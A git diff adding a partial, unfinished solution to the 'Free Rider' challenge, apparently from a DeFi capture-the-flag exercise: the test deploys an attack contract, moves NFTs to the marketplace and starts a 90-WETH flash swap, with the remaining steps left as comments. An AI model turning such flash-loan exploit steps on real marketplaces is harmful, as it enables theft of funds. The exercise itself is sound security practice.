@@ -106,6 +106,46 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        console.log("weth address ",weth.address)
+        console.log("player address ",player.address)
+        console.log("token address ",token.address)
+        console.log("marketplace address ",marketplace.address)
+        console.log("devsContract address ",devsContract.address)
+
+
+        x = await ethers.provider.getBalance(weth.address);
+        console.log("* weth balance is ",x);
+                
+        //deploy contract with receive, fallback
+        attackFactory = await ethers.getContractFactory('attackTimeFree', player);
+        attackContract = await attackFactory.deploy(
+            weth.address,
+            uniswapFactory.address,
+            token.address,
+            marketplace.address,
+            devsContract.address
+        )
+        console.log("attackContract address ",attackContract.address)
+
+        console.log("owner of the nft before is ", await nft.ownerOf(0))
+        //transferFrom deployer to market place
+        for(i=0;i<6;i++)
+        {
+            await nft.transferFrom(deployer.address, marketplace.address, i);
+        }
+        console.log("owner of the nft now is ", await nft.ownerOf(0))
+
+        //flash loan WETH
+        await attackContract.flashSwap(90n*10n**18n);
+
+        //trade for ETH
+
+        //buy all
+
+        //send to freeRiderRecovery
+
+        //lend back flashloan
     });
 
     after(async function () {
